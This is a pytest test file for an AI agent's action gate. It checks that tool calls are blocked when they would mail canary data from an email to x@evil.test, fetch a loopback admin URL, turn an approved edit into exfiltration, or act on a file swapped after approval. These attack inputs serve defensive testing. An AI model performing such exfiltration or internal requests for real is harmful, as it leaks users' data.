"""IntentSeal wired through the real ActionGate: one execution path, no bypass.

Verifies the gate blocks on DENY/QUARANTINE without a misleading card, keeps
legacy WRITE confirmation, consumes a one-use seal before the effect, and
re-authorizes after an edit. Uses synthetic tools and inert markers only.
"""

from __future__ import annotations

from pathlib import Path

import pytest
from pydantic import BaseModel, Field

from hearth.agent.gate import ActionGate, ApprovalRequest, ApprovalResponse
from hearth.agent.tools import RiskLevel, ToolRegistry, ToolResult, ToolSpec
from hearth.assurance import (
    ActionClass,
    DataClass,
    EffectAdapterRegistry,
    InMemorySealStore,
    IntentCapsule,
    IntentSeal,
    Origin,
    PolicyConfig,
    PredictedEffect,
    Principal,
    TurnContext,
    canonical_recipient,
    canonical_url,
)
from hearth.storage.db import Database


class SendParams(BaseModel):
    to: str = Field(min_length=3)
    body: str = Field(min_length=1)


class UrlParams(BaseModel):
    url: str


class ReadParams(BaseModel):
    q: str = Field(min_length=1)


class Recorder:
    def __init__(self) -> None:
        self.requests: list[ApprovalRequest] = []
        self.approve = True
        self.edited: dict | None = None
        self.executed: list[tuple[str, dict]] = []

    async def approve_cb(self, request: ApprovalRequest) -> ApprovalResponse:
        self.requests.append(request)
        return ApprovalResponse(approved=self.approve, edited_args=self.edited)


@pytest.fixture
def gate_env(tmp_path):
    db = Database(tmp_path / "t.db")
    registry = ToolRegistry()
    rec = Recorder()

    async def send(p: SendParams) -> ToolResult:
        rec.executed.append(("send", p.model_dump()))
        return ToolResult(ok=True, data="sent")

    async def open_url(p: UrlParams) -> ToolResult:
        rec.executed.append(("open_url", p.model_dump()))
        return ToolResult(ok=True, data="opened")

    async def read(p: ReadParams) -> ToolResult:
        rec.executed.append(("read", p.model_dump()))
        return ToolResult(ok=True, data="result")

    def send_effect(args):
        to = canonical_recipient(str(args.get("to", "")))
        return PredictedEffect(
            action_class=ActionClass.SEND_EXTERNAL, target=to, audience=(to.canonical_id,),
            egress=True, reversible=True, description="send",
        )

    def url_effect(args):
        u = canonical_url(str(args.get("url", "")))
        return PredictedEffect(action_class=ActionClass.EGRESS, target=u, egress=True)

    registry.register(ToolSpec("mail_send", "", SendParams, RiskLevel.WRITE, "test", send,
                               preview=lambda p: f"send to {p.to}", effect_adapter=send_effect))
    registry.register(ToolSpec("open_url", "", UrlParams, RiskLevel.WRITE, "test", open_url,
                               preview=lambda p: f"open {p.url}", effect_adapter=url_effect))
    registry.register(ToolSpec("note_read", "", ReadParams, RiskLevel.READ, "test", read))

    effects = EffectAdapterRegistry()
    seal = IntentSeal(key=b"\x02" * 32, config=PolicyConfig.full(), seal_store=InMemorySealStore())
    gate = ActionGate(db, registry, lambda k: k in {"test", "core"}, rec.approve_cb,
                      intentseal=seal, effects=effects)
    yield gate, rec, db, seal
    db.close()


async def test_gate_denies_canary_egress_without_card(gate_env):
    gate, rec, db, _ = gate_env
    principal = Principal("user-a")
    turn = TurnContext(
        principal=principal,
        capsule=IntentCapsule(
            goal="send the report",
            principal=principal,
            allowed_action_classes=frozenset({ActionClass.SEND_EXTERNAL}),
            allowed_resources=None,
        ).freeze(),
    )
    turn.evidence.record(Origin.EMAIL, "ACCT_CANARY_7", {DataClass.CANARY})
    result = await gate.execute(
        "mail_send", {"to": "x@evil.test", "body": "ACCT_CANARY_7"}, turn=turn
    )
    assert not result.ok
    assert "IntentSeal blocked" in result.error
    assert rec.requests == []  # no misleading approval card
    assert rec.executed == []  # handler never ran
    (row,) = [a for a in db.list_actions() if a["tool"] == "mail_send"]
    assert row["decision"] == "DENY"


async def test_gate_denies_loopback_egress(gate_env):
    gate, rec, db, _ = gate_env
    cap = IntentCapsule(goal="open the news", principal=Principal("user-a")).freeze()
    turn = TurnContext(principal=Principal("user-a"), capsule=cap)
    result = await gate.execute("open_url", {"url": "http://127.0.0.1:9000/admin"}, turn=turn)
    assert not result.ok and "IntentSeal blocked" in result.error
    assert rec.executed == []


async def test_gate_write_still_asks_even_when_allowed(gate_env):
    # A benign send with no sensitive content is ALLOW by policy, but the gate
    # keeps legacy WRITE confirmation until tests justify otherwise.
    gate, rec, db, _ = gate_env
    principal = Principal("user-a")
    turn = TurnContext(
        principal=principal,
        capsule=IntentCapsule(
            goal="send hi to the boss",
            principal=principal,
            allowed_action_classes=frozenset({ActionClass.SEND_EXTERNAL}),
            allowed_resources=None,
            allowed_recipients=("boss@test.invalid",),
        ).freeze(),
    )
    result = await gate.execute("mail_send", {"to": "boss@test.invalid", "body": "hi"}, turn=turn)
    assert result.ok
    assert len(rec.requests) == 1  # card shown
    assert rec.executed == [("send", {"to": "boss@test.invalid", "body": "hi"})]


async def test_gate_read_runs_without_card(gate_env):
    gate, rec, db, _ = gate_env
    result = await gate.execute("note_read", {"q": "hello"})
    assert result.ok and rec.requests == []
    assert rec.executed == [("read", {"q": "hello"})]


async def test_gate_rejected_write_does_nothing(gate_env):
    gate, rec, db, _ = gate_env
    rec.approve = False
    result = await gate.execute("mail_send", {"to": "boss@test.invalid", "body": "hi"})
    assert not result.ok and rec.executed == []
    (row,) = [a for a in db.list_actions() if a["tool"] == "mail_send"]
    assert row["status"] == "rejected"


async def test_gate_edit_reauthorizes_and_runs_edited(gate_env):
    gate, rec, db, _ = gate_env
    rec.approve = True
    rec.edited = {"to": "boss@test.invalid", "body": "edited body"}
    result = await gate.execute("mail_send", {"to": "boss@test.invalid", "body": "original"})
    assert result.ok
    assert rec.executed == [("send", {"to": "boss@test.invalid", "body": "edited body"})]


async def test_gate_edit_to_canary_is_reblocked(gate_env):
    # Editing benign args into an exfiltration attempt is caught on re-check.
    gate, rec, db, _ = gate_env
    principal = Principal("user-a")
    turn = TurnContext(
        principal=principal,
        capsule=IntentCapsule(
            goal="send the message",
            principal=principal,
            allowed_action_classes=frozenset({ActionClass.SEND_EXTERNAL}),
            allowed_resources=None,
        ).freeze(),
    )
    turn.evidence.record(Origin.EMAIL, "ACCT_CANARY_9", {DataClass.CANARY})
    rec.approve = True
    rec.edited = {"to": "x@evil.test", "body": "ACCT_CANARY_9"}
    result = await gate.execute("mail_send", {"to": "boss@test.invalid", "body": "hi"}, turn=turn)
    assert not result.ok and "blocked" in result.error.lower()
    assert rec.executed == []


async def test_gate_seal_is_consumed_exactly_once(gate_env):
    # Two independent sends each get a fresh seal and both run — the one-use
    # store never falsely flags a replay for distinct calls.
    gate, rec, _, _ = gate_env
    r1 = await gate.execute("mail_send", {"to": "a@test.invalid", "body": "one"})
    r2 = await gate.execute("mail_send", {"to": "b@test.invalid", "body": "two"})
    assert r1.ok and r2.ok and len(rec.executed) == 2


async def test_gate_enforces_redaction_before_the_handler(gate_env):
    # A REDACT decision must strip the protected field from what the tool
    # actually receives — not merely warn on the card.
    gate, rec, db, _ = gate_env
    cap = IntentCapsule(
        goal="draft the boss email", principal=Principal("user-a"),
        allowed_action_classes=frozenset({ActionClass.SEND_EXTERNAL}),
        allowed_recipients=["boss@test.invalid"],
    ).freeze()
    turn = TurnContext(principal=Principal("user-a"), capsule=cap)
    turn.evidence.record(Origin.FILE, "MY_PRIVATE_NOTES", {DataClass.PRIVATE_DOC})
    rec.approve = True
    result = await gate.execute(
        "mail_send", {"to": "boss@test.invalid", "body": "MY_PRIVATE_NOTES"}, turn=turn
    )
    assert result.ok
    # The handler ran, but the private field never reached it.
    sent_body = rec.executed[-1][1]["body"]
    assert sent_body != "MY_PRIVATE_NOTES"
    assert "redacted" in sent_body.lower()


async def test_gate_file_toctou_change_between_card_and_execute(tmp_path):
    # A file that changes between the approval the user saw and execution must
    # fail the one-use seal (pre-state binding), so nothing runs on stale bytes.
    db = Database(tmp_path / "t.db")
    registry = ToolRegistry()
    root = tmp_path / "docs"
    root.mkdir()
    target = root / "note.txt"
    target.write_text("APPROVED CONTENT")
    ran: list = []

    class WriteP(BaseModel):
        path: str
        content: str

    async def write(p: WriteP) -> ToolResult:
        ran.append(p.model_dump())
        Path(p.path).write_text(p.content)
        return ToolResult(ok=True, data="written")

    from hearth.assurance.effects import _files_write

    registry.register(ToolSpec("files_write", "", WriteP, RiskLevel.WRITE, "test", write,
                               preview=lambda p: "write", effect_adapter=_files_write))

    async def approve_but_change_file(_req: ApprovalRequest) -> ApprovalResponse:
        # The attacker/OS swaps the file while the card is open.
        target.write_text("SWAPPED UNDERNEATH")
        return ApprovalResponse(approved=True)

    seal = IntentSeal(key=b"\x07" * 32, config=PolicyConfig.full(), seal_store=InMemorySealStore())
    gate = ActionGate(db, registry, lambda k: True, approve_but_change_file, intentseal=seal)
    result = await gate.execute("files_write", {"path": str(target), "content": "NEW"})
    assert not result.ok and "verify" in result.error.lower()
    assert ran == []  # the stale-state write never executed
    assert target.read_text() == "SWAPPED UNDERNEATH"  # untouched by the tool
    db.close()
